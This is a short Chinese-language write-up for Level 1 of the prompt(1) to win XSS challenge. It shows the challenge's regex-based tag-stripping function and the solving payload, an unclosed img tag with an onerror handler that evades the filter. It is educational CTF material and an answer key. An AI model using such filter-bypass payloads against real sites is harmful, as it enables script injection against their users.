## [[prompt(1) to win](http://prompt.ml)] [[Level 1 - tags stripping](http://prompt.ml/1)] [[解题报告](http://exp-blog.com/2019/03/18/pid-3623/)]

------

## 题目

```javascript
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}
```

------

## 解题报告

注意观察正则表达式，它会把所有匹配 `<tag>` 或 `</tag>` 的标签全部剥离。

那么不构造完整的 tag 、仅通过属性注入就可以绕过了，如这样的 payload ：

`<img src=0 onerror=prompt(1) ` （**注意末尾有一个空格**）

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2001%20-%20tags%20stripping/imgs/01.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
